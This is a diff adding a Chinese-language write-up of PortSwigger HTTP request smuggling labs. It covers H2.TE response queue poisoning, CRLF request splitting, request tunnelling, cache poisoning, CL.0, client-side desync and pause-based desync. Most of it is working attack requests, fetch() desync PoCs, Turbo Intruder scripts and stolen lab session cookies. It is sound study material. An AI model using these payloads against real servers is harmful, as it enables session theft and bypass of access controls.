@@ -1,6 +1,8 @@
 ---
 title: HTTP request smuggling
 description: HTTP request smuggling
+last_update:
+  date: "2025-11-08T08:00:00+08:00"
 ---
 
 ## 前言
@@ -1694,6 +1696,780 @@ sequenceDiagram
   Client ->> Frontend Server: Request 4
   Frontend Server ->> Client: Response 3
 ```
+
+## Lab: Response queue poisoning via H2.TE request smuggling
+
+| Dimension | Description                                                                                                                                                         |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning                                                                            |
+| Lab       | https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling |
+
+Attack Request
+
+```
+POST / HTTP/2
+Host: 0a9000e1043742398090175e00b500ea.web-security-academy.net
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+Host: 0a9000e1043742398090175e00b500ea.web-security-academy.net
+
+
+```
+
+normal request
+
+```
+POST / HTTP/2
+Host: 0a9000e1043742398090175e00b500ea.web-security-academy.net
+
+
+```
+
+steal response
+
+```
+HTTP/2 302 Found
+Location: /my-account?id=administrator
+Set-Cookie: session=uMfEUfnuflnmXgCfg42vZP1sS07uBfDh; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+
+```
+
+用這個 session 就可以成功通關～
+
+## HTTP/2 request splitting
+
+[Response queue poisoning](#response-queue-poisoning) 提供的 PoC，是把 smuggled request 放在 body，所以第一個 request 就必須得是 POST 才能帶 body
+
+如果想要讓第一個 request 是 GET 且沒有 body 的話，在 HTTP/2 的世界，可以把 smuggled request 塞在 headers
+
+```
+:method: GET
+:path: /
+:authority: vulnerable-website.com
+Hello: world\r\n\r\nGET /admin HTTP/1.1
+
+
+```
+
+HTTP/2 Downgrade 到 HTTP/1.1，會把 `:authority` 轉成 Host，假設這是添加到 Request Headers 最後面的話，會導致 smuggled request 有兩個 Host
+
+```
+GET / HTTP/1.1
+Hello: world
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Host: vulnerable-website.com
+
+
+```
+
+解法也很優美，就是把 `\r\nHost: vulnerable-website.com` 往前移
+
+```
+:method: GET
+:path: /
+:authority: vulnerable-website.com
+Hello: world\r\nHost: vulnerable-website.com\r\n\r\nGET /admin HTTP/1.1
+
+
+```
+
+Downgrade 之後，變成兩個完整的 HTTP Request
+
+```
+GET / HTTP/1.1
+Hello: world
+Host: vulnerable-website.com
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+
+
+```
+
+能想到這個技巧的人，真的是大神...
+
+## Lab: HTTP/2 request splitting via CRLF injection
+
+| Dimension | Description                                                                                                                   |
+| --------- | ----------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/advanced#http-2-request-splitting                                      |
+| Lab       | https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection |
+
+Attack Request
+
+```
+GET / HTTP/2
+Host: 0ae3003c0494d41b9055e66000d90003.web-security-academy.net
+Hello: world\r\nHost: 0ae3003c0494d41b9055e66000d90003.web-security-academy.net\r\n\r\nGET /404 HTTP/1.1
+
+
+```
+
+normal request
+
+```
+GET / HTTP/2
+Host: 0ae3003c0494d41b9055e66000d90003.web-security-academy.net
+
+
+```
+
+steal response
+
+```
+HTTP/2 302 Found
+Location: /my-account?id=administrator
+Set-Cookie: session=oTx0R1cBtq4eXtAUi4MJTVR2M2dos7BW; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+
+```
+
+用這個 session 就可以成功通關～
+
+## 觀念澄清
+
+前面的 labs，都是建立在 Frontend Server > Backend Server 使用一個 TCP Connection 來處理多個 HTTP Request
+
+## HTTP request tunnelling
+
+https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling
+
+### Leaking internal headers via HTTP/2 request tunnelling
+
+概念：利用 downgrade 機制，把 internal headers 塞到 HTTP/1.1 的 request body，並且利用 application 的留言功能，讓 request body 最終可以帶出來
+
+P.S. 不一定要留言功能，修改聯絡地址, 聊天私訊等等都可以
+
+PoC
+
+```
+:method: POST
+:path: /comment
+:authority: vulnerable-website.com
+content-type: application/x-www-form-urlencoded
+foo: bar\r\nContent-Length: 200\r\n\r\ncomment=
+
+x=1
+```
+
+Downgrade 後
+
+```
+POST /comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+foo: bar
+Content-Length: 200
+
+comment=X-Internal-Header: secretContent-Length: 3
+x=1
+```
+
+<!-- todo-yus ps 的範例少了 foo: bar -->
+
+### Blind request tunnelling
+
+https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#blind-request-tunnelling
+
+概念就是 [2 complete request](#2-complete-request)，如果 Frontend Server 只回傳第一個 Response，那就是 "Blind request tunnelling"
+
+### Non-blind request tunnelling using HEAD
+
+https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head
+
+複習一下 [HEAD Request Method](../http/http-request-methods-1.md#head)
+
+漏洞成因：Frontend Server 真的依照 HEAD Response 的 `Content-Length` 讀取對應長度的 bytes
+
+正常 Request
+
+```
+HEAD /search?q=123 HTTP/2
+Host: vulnerable-website.com
+
+
+```
+
+正常 Response
+
+```
+HTTP/2 200 OK
+Content-Type: text/html
+Content-Length: 9487
+
+
+```
+
+Attack Request
+
+```
+:method: HEAD
+:path: /search?q=123
+:authority: vulnerable-website.com
+foo: bar\r\n\r\nGET /tunnelled HTTP/1.1\r\nHost: vulnerable-website.com
+
+
+```
+
+After downgrade
+
+```
+GET /search?q=123 HTTP/1.1
+Host: vulnerable-website.com
+foo: bar
+
+GET /tunnelled HTTP/1.1
+Host: vulnerable-website.com
+
+
+```
+
+Vulnerable Response
+
+```
+HTTP/2 200 OK
+Content-Type: text/html
+Content-Length: 9487
+
+<h1>This is a tunnelled response</h1>...
+```
+
+:::warning
+9487 是 /search?q=123 回傳的 Content-Length
+
+- 情境1: 如果 /tunnelled 的 CL > 9487，則 tunnelled response 會被截斷
+- 解法1: 把 /search?q=123 替換成 CL 更長的
+- 情境2: 如果 /tunnelled 的 CL < 9487，則 response 會 timeout
+- 解法2: 把 /search?q=123 替換成 CL 更短的，或是讓 /tunnelled?q=padding 使得 CL 變長
+  :::
+
+## Lab: Bypassing access controls via HTTP/2 request tunnelling
+
+| Dimension | Description                                                                                                                                               |
+| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling                                                                        |
+| Lab       | https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling |
+
+先嘗試用 [Leaking internal headers via HTTP/2 request tunnelling](#leaking-internal-headers-via-http2-request-tunnelling) 的技巧
+
+PoC
+
+```
+POST /post/comment HTTP/2
+Host: 0a0500e503031d9f8153a7c1001a0044.web-security-academy.net
+Cookie: session=PYvVc1oo869ntuZi6LWpqAG4A65fxJrj
+Hello: world\r\nContent-Length: 150\r\n\r\ncsrf=CmAkbi6e5zIUPwueeB7Gyocc4DWrKFtH&postId=9&name=123&email=123@123&comment=
+
+x=1
+```
+
+結果得到 "RST_STREAM received with error code: 0x1 (PRotocal error detected)"，嘗試簡化 PoC
+
+```
+POST /post/comment HTTP/2
+Host: 0a0500e503031d9f8153a7c1001a0044.web-security-academy.net
+Cookie: session=PYvVc1oo869ntuZi6LWpqAG4A65fxJrj
+Hello: world\r\n
+
+x=1
+```
+
+結果一樣，代表 header value 注入 `\r\n` 這個技巧直接不能用，後來看了 Lab 的描述，才發現 `\r\n` 應該要注入在 header name
+
+```
+fails to adequately sanitize incoming header names
+```
+
+Attack Request
+
+```
+POST / HTTP/2
+Host: 0a5a000a0419bb3484980fb3009e00d1.web-security-academy.net
+Cookie: session=KCP9rkqzFxwIEEuBJ1kz26PfOCtCvvM6
+foo: bar\r\nContent-Length: 159\r\n\r\nsearch=x: value
+
+
+```
+
+Frontend 塞完 Custom Headers
+
+```
+POST / HTTP/2
+Host: 0a5a000a0419bb3484980fb3009e00d1.web-security-academy.net
+Cookie: session=KCP9rkqzFxwIEEuBJ1kz26PfOCtCvvM6
+foo: bar\r\nContent-Length: 159\r\n\r\nsearch=x: value
+custom-header: hello
+
+
+```
+
+Downgrade 後
+
+```
+POST / HTTP/2
+Host: 0a5a000a0419bb3484980fb3009e00d1.web-security-academy.net
+Cookie: session=KCP9rkqzFxwIEEuBJ1kz26PfOCtCvvM6
+foo: bar
+Content-Length: 164
+
+search=x: value
+custom-header: hello
+```
+
+Response
+
+```
+0 search results for 'x: value
+cookie: session=KCP9rkqzFxwIEEuBJ1kz26PfOCtCvvM6
+X-SSL-VERIFIED: 0
+X-SSL-CLIENT-CN: null
+X-FRONTEND-KEY: 8373196746507188
+Content-Length: 0
+
+'
+```
+
+其實以技巧來說不難，就是 [Leaking internal headers via HTTP/2 request tunnelling](#leaking-internal-headers-via-http2-request-tunnelling)，只是範例是注入 header value，這題是注入 header name，光是這樣的改變，就把我整不會了QQ
+
+之後就是用 [Non-blind request tunnelling using HEAD](#non-blind-request-tunnelling-using-head) 的技巧
+
+```
+HEAD /?search=123 HTTP/2
+Host: 0a5a000a0419bb3484980fb3009e00d1.web-security-academy.net
+Cookie: session=KCP9rkqzFxwIEEuBJ1kz26PfOCtCvvM6
+foo: bar\r\nGET /admin HTTP/1.1\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\nX-FRONTEND-KEY: 8373196746507188\r\n\r\n: hello
+
+
+```
+
+其中 `/?search=123` 的 CL 是 3295，smuggled request `/admin` 的 CL 更大，所以讀出來的 HTML 會被截斷
+
+P.S. 如果 `/?search=123` 的 CL > smuggled request 的 CL，則會看到
+
+```html
+<html>
+  <head>
+    <title>Server Error: Proxy error</title>
+  </head>
+  <body>
+    <h1>Server Error: Received only 372 of expected 3295 bytes of data</h1>
+  </body>
+</html>
+```
+
+最後就是把 `/admin` 改成 `/admin/delete?username=carlos`，portSwigger 一貫的手法，成功通關～
+
+但這題第一次解，都是直接看 Solution，EXPERT 等級的題目，真的需要融會貫通，通常不是範例給的 PoC 就能直接通關，且題目敘述要認真看啊QQ
+
+## Lab: Web cache poisoning via HTTP/2 request tunnelling
+
+| Dimension | Description                                                                                                                                            |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#web-cache-poisoning-via-http-2-request-tunnelling                   |
+| Lab       | https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling |
+
+這題我第一次也是直接看 Solution，當作練習，畢竟 EXPERT 等級的題目QQ
+
+CRLF 的注入點是 `:path`，所以是什麼地方都可以嘗試注入看看了嗎...?
+
+Attack Request
+
+```
+HEAD / HTTP/1.1\r\nHost: 0a580095046c649080c4cb60003b00ae.web-security-academy.net\r\n\r\nGET /post?postId=6 HTTP/1.1\r\nFoo: bar HTTP/2
+Host: 0a580095046c649080c4cb60003b00ae.web-security-academy.net
+
+
+```
+
+Downgrade 之後
+
+```
+HEAD / HTTP/1.1
+Host: 0a580095046c649080c4cb60003b00ae.web-security-academy.net
+
+GET /post?postId=6 HTTP/1.1
+Foo: bar
+Host: 0a580095046c649080c4cb60003b00ae.web-security-academy.net
+
+
+```
+
+這題是 Non-Blind Request Tunnelling + Server 會從 HEAD Request's Response 讀取對應 CL 的數據，結果如下
+
+```
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=eVqdfn2rJtSMQpm5koiOisgwUPd7VrFb; Secure; HttpOnly; SameSite=None
+Content-Length: 8478
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=KvaDQ916QKIF8MkpXOn9umniBpI52ct8; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Keep-Alive: timeout=0
+Content-Length: 9206
+
+<!DOCTYPE html>
+<html>
+...
+```
+
+smuggled request's response 剛好會被截斷在 8478，並且此 response 會被 cache
+
+接下來是要找 HTTP response 包含 unencoded HTML，我這邊也是找了很久找不到，後來看到 PortSwigger 提供的 Solution 是
+
+```
+GET /resources?<script>alert(1)</script> HTTP/2
+Host: 0a580095046c649080c4cb60003b00ae.web-security-academy.net
+
+
+```
+
+Response
+
+```
+HTTP/2 302 Found
+Location: /resources/?<script>alert(1)</script>
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Content-Length: 0
+
+
+```
+
+這招狠...我沒想過 Location Header 也算，反正之後就是
+
+```
+HEAD / HTTP/1.1\r\nHost: 0a580095046c649080c4cb60003b00ae.web-security-academy.net\r\n\r\nGET /resources?<script>alert(1)</script> HTTP/1.1\r\nFoo: bar HTTP/2
+Host: 0a580095046c649080c4cb60003b00ae.web-security-academy.net
+
+
+```
+
+記得 `<script>alert(1)</script>` 後面要補 padding，補到 > `HEAD / HTTP/1.1` 回傳的 CL 即可通關～
+
+## Lab: 0.CL request smuggling
+
+| Dimension | Description                                                                                                 |
+| --------- | ----------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/advanced#0-cl-request-smuggling                      |
+| Lab       | https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling |
+
+這題就是 [HTTP/1.1 must die: the desync endgame](https://portswigger.net/research/http1-must-die)，但這種 whitepaper 啃起來超累...
+
+<!-- todo-yus 研究等級的題目，未來有空再做 -->
+
+## Testing for CL.0 vulnerabilities
+
+Attack Request
+
+```
+POST /vulnerable-endpoint HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
+
+Normal Request
+
+```
+GET / HTTP/1.1
+Host: vulnerable-website.com
+
+
+```
+
+如果 Normal Request's Response 是 404，則代表有漏洞
+
+## Lab: CL.0 request smuggling
+
+| Dimension | Description                                                                                    |
+| --------- | ---------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/browser/cl-0                            |
+| Lab       | https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling |
+
+這題要先找到 "可以用 POST 帶 Body 的 Endpoint" + "不會去讀取 Request Body" => 才能把 smuggled prefix 塞到 TCP/TLS socket
+
+Attack Request
+
+```
+POST /resources/images/blog.svg HTTP/1.1
+Host: 0a94005d0475b497815b39bd00050049.web-security-academy.net
+Content-Length: 50
+
+GET /admin/delete?username=carlos HTTP/1.1
+Foo: x
+```
+
+Followed By Normal Request
+
+```
+POST / HTTP/1.1
+Host: 0a94005d0475b497815b39bd00050049.web-security-academy.net
+
+
+```
+
+記得要用 Burp Repeater "Send Group (single connection)"
+
+Normal Request's Response
+
+```
+HTTP/1.1 302 Found
+Location: /admin
+Set-Cookie: session=k4D7Av7ExiDdqPhhLYeiGy6U0vSuO8td; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Keep-Alive: timeout=10
+Content-Length: 0
+
+
+```
+
+## What is a client-side desync attack?
+
+https://portswigger.net/web-security/request-smuggling/browser/client-side-desync
+
+以下節錄 PortSwigger 原文
+
+Web servers can sometimes be encouraged to respond to POST requests without reading in the body. If they subsequently allow the browser to reuse the same connection for additional requests, this results in a client-side desync vulnerability.
+
+In high-level terms, a CSD attack involves the following stages:
+
+The victim visits a web page on an arbitrary domain containing malicious JavaScript.
+
+The JavaScript causes the victim's browser to issue a request to the vulnerable website. This contains an attacker-controlled request prefix in its body, much like a normal request smuggling attack.
+
+The malicious prefix is left on the server's TCP/TLS socket after it responds to the initial request, desyncing the connection with the browser.
+
+The JavaScript then triggers a follow-up request down the poisoned connection. This is appended to the malicious prefix, eliciting a harmful response from the server.
+
+As these attacks don't rely on parsing discrepancies between two servers, this means that even single-server websites may be vulnerable.
+
+PoC
+
+```ts
+fetch("https://vulnerable-website.com/vulnerable-endpoint", {
+  method: "POST",
+  body: "GET /hopefully404 HTTP/1.1\r\nFoo: x",
+  mode: "no-cors",
+  credentials: "include",
+}).then(() => {
+  location = "https://vulnerable-website.com/";
+});
+```
+
+### Handling redirectss
+
+概念：requests to endpoints that trigger server-level redirects are a common vector for client-side desyncs
+
+問題：瀏覽器會自動 follow redirect
+
+解法：no-cors + catch
+
+```ts
+fetch("https://vulnerable-website.com/redirect-me", {
+  method: "POST",
+  body: "GET /hopefully404 HTTP/1.1\r\nFoo: x",
+  mode: "cors",
+  credentials: "include",
+}).catch(() => {
+  location = "https://vulnerable-website.com/";
+});
+```
+
+## Lab: Client-side desync
+
+| Dimension | Description                                                                                              |
+| --------- | -------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/browser/client-side-desync                        |
+| Lab       | https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync |
+
+這題一進去就看到 path 是 `/en`，肯定有鬼，經過一番測試，PoC
+
+```ts
+fetch("https://0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net", {
+  method: "POST",
+  body: "GET /hopefully404 HTTP/1.1\r\nFoo: x",
+  mode: "cors",
+  credentials: "include",
+}).catch(() => {
+  location =
+    "https://0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net/en";
+});
+```
+
+成功看到 404 "Not Found"，第一階段的偵查成功～
+
+後續就是把 smuggled request 改成 `/post/comment`
+
+```ts
+fetch("https://0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net", {
+  method: "POST",
+  body: "POST /en/post/comment HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=O5B2rdUODHOZnqhkw35diThu9WjxR8dt\r\nContent-Length: 1219\r\nHost: 0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net\r\n\r\ncsrf=x1ziw05SX2l96CO8XrLzAltueUiMWLRD&postId=7&name=victim15&email=1%401&comment=",
+  mode: "cors",
+  credentials: "include",
+}).catch(() => {
+  location =
+    "https://0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net/en";
+});
+```
+
+到評論頁提取 victim 的 session 即可通關～
+
+## Client-side cache poisoning
+
+https://portswigger.net/web-security/request-smuggling/browser/client-side-desync#client-side-cache-poisoning
+
+<!-- todo-yus 還沒讀 -->
+
+## Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling
+
+https://portswigger.net/research/browser-powered-desync-attacks
+
+<!-- todo-yus 還沒讀 -->
+
+## Pause-based desync attacks
+
+https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync
+
+Pause-based desync vulnerabilities can occur when a server times out a request but leaves the connection open for reuse.
+
+流程，請一定要看 [Server-side pause-based desync](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync#server-side-pause-based-desync)，寫的超詳細，這技巧有夠猛
+
+<!-- todo-yus diagram -->
+
+## Lab: Server-side pause-based request smuggling
+
+| Dimension | Description                                                                                                                     |
+| --------- | ------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync                                               |
+| Lab       | https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling |
+
+基本上按照 Document 的方法走，這題沒有到很難
+
+Attack Request
+
+```
+POST /resources HTTP/1.1
+Host: 0a1800f503ac22a881c1cbdf000500af.web-security-academy.net
+Connection: keep-alive
+Content-Length: 50
+
+GET /admin/ HTTP/1.1
+Foo: x
+```
+
+Turbo Intruder
+
+```py
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=1,
+                          requestsPerConnection=100,
+                          pipeline=False
+                          )
+
+    # Smuggling request with pause
+    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
+
+    # Follow-up request
+    followUp = 'GET / HTTP/1.1\r\nConnection: keep-alive\r\nHost: localhost\r\n\r\n'
+    engine.queue(followUp)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+`GET /admin/` Response
+
+```html
+<form
+  style="margin-top: 1em"
+  class="login-form"
+  action="/admin/delete"
+  method="POST"
+>
+  <input
+    required
+    type="hidden"
+    name="csrf"
+    value="nCZATckw9hTMPAzt7z94ycqxFib6TjMs"
+  />
+  <label>Username</label>
+  <input required type="text" name="username" />
+  <button class="button" type="submit">Delete user</button>
+</form>
+```
+
+這題竟然不是熟悉的 `/admin/delete?username=carlos`，笑死
+
+調整 Attack Request
+
+```
+POST /resources HTTP/1.1
+Host: 0a1800f503ac22a881c1cbdf000500af.web-security-academy.net
+Connection: keep-alive
+Content-Length: 183
+
+POST /admin/delete/ HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 147
+Host: localhost
+
+csrf=nCZATckw9hTMPAzt7z94ycqxFib6TjMs&username=carlos&otherShit=
+```
+
+調整 Turbo Intruder
+
+```py
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=1,
+                          requestsPerConnection=100,
+                          pipeline=False
+                          )
+
+    # Smuggling request with pause
+    engine.queue(target.req, pauseMarker=['Content-Length: 183\r\n\r\n'], pauseTime=61000)
+
+    # Follow-up request
+    followUp = 'GET / HTTP/1.1\r\nHost: 0a1800f503ac22a881c1cbdf000500af.web-security-academy.net\r\n\r\n'
+    engine.queue(followUp)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+- 183 = `POST /admin ... otherShit=` 的 byte length
+- 147 = `csrf=...` + followUp 的 byte length
+
+終於成功通關...
+
+## 小結
+
+這個系列的 Labs 真的是我打過最難，最燒腦的 Labs，但我覺得如果能學會，並且在真實世界 exploit 的話，成就感會遠遠大於 SQLi, XSS 這種找到爛掉的漏洞
 
 ## 參考資料
 
